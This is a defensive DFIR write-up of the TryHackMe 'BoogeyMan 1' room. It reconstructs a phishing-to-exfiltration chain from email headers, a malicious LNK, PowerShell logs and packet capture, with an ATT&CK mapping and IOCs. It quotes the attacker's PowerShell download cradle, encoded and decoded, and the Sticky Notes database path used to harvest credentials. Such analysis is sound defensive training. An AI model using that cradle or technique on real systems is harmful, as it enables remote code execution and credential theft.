# BoogeyMan 1 | Blue Team / DFIR Investigation 

**Category:** SOC Level 1 Capstone — Phishing & Endpoint/Network Forensics
**Platform:** TryHackMe
**Difficulty:** Medium
**Skills Demonstrated:** Email Header Analysis, Phishing Triage, LNK File Forensics, Base64/PowerShell Payload Decoding, Windows PowerShell Event Log Analysis, Network Traffic Analysis (Wireshark/Tshark), C2 Traffic Identification, CyberChef Decoding


---

## 1. Scenario Overview

**Victim:** Julianne Westcott, a finance employee at **Quick Logistics LLC**
**Vector:** A spoofed follow-up email regarding an "unpaid invoice," impersonating a real business partner, **B Packaging Inc.**
**Threat Actor:** A newly identified group tracked as **"Boogeyman,"** known for targeting the logistics sector.

The attacker sent a phishing email with a password-protected `Invoice.zip` attachment containing a malicious `.lnk` (Windows shortcut) file. Executing the `.lnk` triggered an obfuscated PowerShell one-liner that downloaded and ran a second-stage payload, leading to host enumeration, access to sensitive local application data, and outbound C2/exfiltration traffic disguised as normal HTTP.

This investigation reconstructs the full attack chain using three provided artefacts:
- `dump.eml` — the phishing email
- `powershell.json` — PowerShell ScriptBlock logs (converted from `.evtx` via `evtx2json`)
- `capture.pcapng` — a network packet capture from the victim's workstation

---

## 2. Tools Used

| Tool | Purpose |
|---|---|
| Thunderbird | Viewing and inspecting the raw phishing email (`dump.eml`) |
| Email header analyzer | Parsing DKIM-Signature / List-Unsubscribe headers to identify the mail relay |
| LNKParse3 | Extracting embedded Command Line Arguments from the malicious `.lnk` file |
| CyberChef | Decoding Base64/UTF-16LE PowerShell payloads and exfiltrated data |
| `jq` | Parsing and sorting JSON-formatted PowerShell ScriptBlock logs |
| Wireshark / Tshark | Analyzing network traffic for HTTP-based C2 and file transfer activity |

---

## 3. Step-by-Step Walkthrough

### Task 2 — Email Analysis ("Look at that headers!")

**Steps:**
1. Opened `dump.eml` in Thunderbird to inspect the sender, recipient, and body content.
2. Extracted the full raw headers via **View → Message Source** and ran them through a message header analyzer to trace the delivery path.
3. Identified and extracted the malicious `Invoice.zip` attachment, noted its password (included in the email body as a "helpful" instruction — a common social-engineering technique to bypass attachment scanning), and extracted its contents.
4. Ran **LNKParse3** against the extracted `.lnk` file to reveal its embedded PowerShell command line.

**Findings:**
| Question | Answer |
|---|---|
| Sending (attacker) email address | `agriffin@bpakcaging.xyz` |
| Victim email address | `julianne.westcott@hotmail.com` |
| Third-party mail relay (from DKIM-Signature / List-Unsubscribe headers) | `elasticemail` |
| File inside the encrypted attachment | `Invoice_20230103.lnk` |
| Password of the encrypted attachment | `Invoice2023!` |
| Encoded payload in the LNK's Command Line Arguments | `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==` |

**Decoded PowerShell command** (Base64 → UTF-16LE, as used natively by `powershell.exe -EncodedCommand`):
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

This is a classic **download-cradle** pattern: the LNK invokes PowerShell, which fetches a second-stage script from the attacker's file-hosting domain and executes it entirely in memory via `Invoke-Expression` (`iex`), leaving minimal disk artefacts.

**Note on the impersonated domain:** The attacker registered `bpakcaging.xyz` — a **typosquat** of the real partner domain `bpackaging.xyz`/similar (missing the "c" in "packaging") — a common technique to make phishing infrastructure appear legitimate at a glance.

---

### Task 3 — Endpoint Security ("Are you sure that's an invoice?")

**Steps:**
1. Parsed the PowerShell ScriptBlock logs (`powershell.json`) using `jq`, sorting entries chronologically to reconstruct the execution timeline:
   ```bash
   cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq
   ```
2. Reviewed the deduplicated script blocks to identify every domain contacted and every tool downloaded/executed on the host.

**Findings:**
| Question | Answer |
|---|---|
| Domains used for file hosting and C2 (alphabetical order) | `cdn.bpakcaging.xyz, files.bpakcaging.xyz` |
| Enumeration tool downloaded by the attacker | **Seatbelt** (a well-known open-source Windows host/security-posture enumeration tool) |
| File accessed via the downloaded `sq3.exe` binary | `C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite` |

**Analysis:** `sq3.exe` is a portable SQLite client binary. The attacker used it to directly query the **Sticky Notes** application's local SQLite database (`plum.sqlite`) — a well-documented technique for harvesting sensitive information (passwords, personal notes, internal references) that users often carelessly store in note-taking apps.

---

### Task 4 — Network Traffic Analysis ("They got us. Call the bank immediately!")

**Steps:**
1. Opened `capture.pcapng` in Wireshark and filtered for HTTP traffic to the identified file-hosting domain (`files.bpakcaging.xyz`).
2. Inspected HTTP response headers/banners to fingerprint the server software hosting the payloads.
3. Identified the HTTP method used to exfiltrate command output back to the attacker's infrastructure.
4. Filtered specifically for traffic referencing `sq3.exe` (`http contains "sq3.exe"`), followed the TCP stream, and decoded the exfiltrated content via CyberChef.

**Findings:**
| Question | Answer |
|---|---|
| Software hosting the attacker's file/payload server | **Python** (i.e., Python's built-in `http.server` module — a lightweight, quickly-deployable web server frequently used by attackers for staging payloads) |
| HTTP method used by the C2 to receive command output | **POST** |
| Password of the exfiltrated file | `%p9³!lL^Mz47E2GaT^y` |

**Analysis:** The use of Python's built-in HTTP server is a strong indicator of a fast, low-effort C2/staging setup rather than a purpose-built C2 framework — consistent with a financially motivated actor targeting a narrow vertical (logistics) rather than a highly resourced APT.

---

## 4. Attack Chain Summary

```
Phishing Email (spoofed vendor, agriffin@bpakcaging.xyz)
        │
        ▼
Password-protected Invoice.zip → Invoice_20230103.lnk
        │
        ▼
LNK executes obfuscated PowerShell (Base64/UTF-16LE encoded)
        │
        ▼
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
        │
        ▼
Second-stage script executed in memory (fileless)
        │
        ▼
Host enumeration via Seatbelt  +  sq3.exe queries Sticky Notes DB (plum.sqlite)
        │
        ▼
Data exfiltrated via HTTP POST to attacker C2 (Python-hosted server)
        │
        ▼
Password-protected exfil archive recovered from PCAP + decoded via CyberChef
```

---

## 5. MITRE ATT&CK Mapping

| Step / Finding | Tactic | Technique ID | Technique Name | Justification |
|---|---|---|---|---|
| Spoofed vendor phishing email | Initial Access | **T1566.001** | Phishing: Spearphishing Attachment | A targeted email impersonating a known business partner delivered a malicious attachment to a finance employee. |
| Password-protected ZIP with malicious `.lnk` | Defense Evasion | **T1027.006 / T1204.002** | Obfuscated Files or Information: HTML Smuggling *(archive protection)* / User Execution: Malicious File | The archive password was included in the email body specifically to prevent automated email-gateway/AV scanning from inspecting the payload, requiring manual user interaction to execute. |
| Malicious `.lnk` shortcut execution | Execution | **T1204.002 / T1547.009** | User Execution: Malicious File / Shortcut Modification | The victim executing the `.lnk` file triggered the embedded malicious command line. |
| Base64/UTF-16LE encoded PowerShell command | Execution / Defense Evasion | **T1059.001 / T1027** | Command and Scripting Interpreter: PowerShell / Obfuscated Files or Information | The payload was encoded to evade signature-based detection and logging clarity, consistent with `-EncodedCommand` usage. |
| In-memory download & execution via `IEX` / `downloadstring` | Execution / Defense Evasion | **T1105 / T1620** | Ingress Tool Transfer / Reflective Code Loading | The second-stage payload was downloaded and executed directly in memory without touching disk, minimizing forensic artefacts. |
| Host enumeration using Seatbelt | Discovery | **T1082 / T1518** | System Information Discovery / Software Discovery | Seatbelt is a known open-source tool for enumerating host security configuration and installed software. |
| Querying Sticky Notes SQLite DB via `sq3.exe` | Collection | **T1005 / T1552.001** | Data from Local System / Unsecured Credentials: Credentials In Files | The attacker directly queried a local application database likely to contain sensitive user-stored information. |
| C2 traffic over HTTP (Python-hosted server) | Command and Control | **T1071.001** | Application Layer Protocol: Web Protocols | The attacker used standard HTTP (not a custom protocol) to blend C2/exfil traffic with legitimate web traffic. |
| Data exfiltration via HTTP POST | Exfiltration | **T1041** | Exfiltration Over C2 Channel | Collected data was POSTed back to the attacker's infrastructure over the same channel used for command delivery. |
| Password-protected exfiltrated archive | Exfiltration / Defense Evasion | **T1560.001** | Archive Collected Data: Archive via Utility | The exfiltrated data was password-protected/archived prior to transfer, likely to evade content-inspection/DLP controls. |

---

## 6. OWASP Applicability

This investigation is a **Blue Team / Digital Forensics & Incident Response (DFIR)** exercise involving phishing, endpoint compromise, and network-based C2 — not a web application security assessment. As such, the **OWASP Top 10** is **not applicable** to this room's scope and has intentionally been omitted from this report. The **MITRE ATT&CK Framework** (Section 5) is the more appropriate and industry-standard reference for classifying this type of adversary behavior.

---

## 7. Indicators of Compromise (IOC) Summary

| Type | Indicator |
|---|---|
| Sender (phishing) email | `agriffin@bpakcaging.xyz` |
| Victim email | `julianne.westcott@hotmail.com` |
| Mail relay service abused | ElasticEmail |
| Malicious archive | `Invoice.zip` (password: `Invoice2023!`) |
| Malicious shortcut | `Invoice_20230103.lnk` |
| File-hosting / C2 domain | `cdn.bpakcaging.xyz` |
| File-hosting / C2 domain | `files.bpakcaging.xyz` |
| Downloaded enumeration tool | Seatbelt |
| Downloaded SQLite utility | `sq3.exe` |
| Accessed local database | `plum.sqlite` (Microsoft Sticky Notes) |
| C2 server software | Python (`http.server`) |
| Exfil archive password | `%p9³!lL^Mz47E2GaT^y` |

---

## 8. Key Takeaways

- **Password-protected attachments are a red flag, not a legitimacy signal.** Attackers routinely use them specifically to defeat automated email-gateway scanning — analysts and end users should treat "here's the password" phishing emails with heightened suspicion.
- **`.lnk` files are a persistent and effective initial-access vector** because they appear as harmless shortcuts but can embed full command lines, including obfuscated PowerShell.
- **Base64-encoded PowerShell (`-EncodedCommand`) is UTF-16LE, not UTF-8** — analysts decoding such payloads must account for this encoding or risk misinterpreting the recovered script.
- **Legitimate local application databases (e.g., Sticky Notes) can be a goldmine for attackers**, since users often store sensitive information (passwords, personal notes) in tools not designed for secure storage.
- **PowerShell ScriptBlock Logging** (as reconstructed from `powershell.json`) is an invaluable, high-fidelity forensic source for reconstructing fileless attack chains that leave few traditional disk-based artefacts.
- **Domain typosquatting** (e.g., `bpakcaging.xyz` vs. the legitimate partner domain) remains one of the simplest and most effective techniques for making phishing infrastructure appear trustworthy at a glance.

---

## 9. References

- TryHackMe — *BoogeyMan* room (SOC Level 1 Capstone Challenge).
- MITRE ATT&CK® Framework — [attack.mitre.org](https://attack.mitre.org)
- Seatbelt (GhostPack) — [github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
- CyberChef — [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/)
